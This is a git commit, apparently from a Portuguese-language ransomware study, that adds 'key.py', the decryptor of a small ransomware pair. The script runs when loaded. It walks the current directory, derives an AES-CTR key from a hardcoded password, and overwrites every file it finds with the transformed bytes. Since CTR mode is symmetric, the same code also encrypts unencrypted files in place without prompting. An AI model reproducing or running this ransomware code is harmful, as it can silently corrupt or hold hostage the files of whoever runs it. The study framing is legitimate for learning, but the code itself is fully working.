18f275f11b00f32b110f3d5442085711b6721fd3
TioCoracao <38505663+TioCoracao@users.noreply.github.com>
2022-08-21 13:58:36 -0300

    Add files via upload
    Estudo sobre Funcionamento de Ransomware

---
+++ RansomWare Cry_xpx/key.py
@@ -0,0 +1,32 @@
+import os
+import pyaes
+import hashlib
+
+arquivos = []
+#Bloco para buscar os arquivos 
+def ScanArquivo():
+ 
+    for arquivo in os.listdir():
+        if arquivo == "Cry_xpx.py" or arquivo == "key.py":
+            continue
+        if os.path.isfile(arquivo):
+            arquivos.append(arquivo)
+    print(arquivos)
+    xpxActionxpx()
+#Bloco Para gerar Chave  
+def Key(dados):
+    Senha= "Minha@Senha".encode()
+    key = hashlib.sha256(Senha).digest() #Gera Hash que será usada como Key do nosso AES
+    aes = pyaes.AESModeOfOperationCTR(key)
+    dados_xpx = aes.decrypt(dados) #Criptografa os Dados.
+    return dados_xpx
+#bloco para decriptografar os arquivos
+def xpxActionxpx():
+    for arquivo in arquivos:
+        with open(arquivo,"rb") as xpx:
+            data =xpx.read()
+            xpx_data = Key(data)
+        with open(arquivo,"wb") as xpx_Cry:
+            xpx_Cry.write(xpx_data)
+
+ScanArquivo()
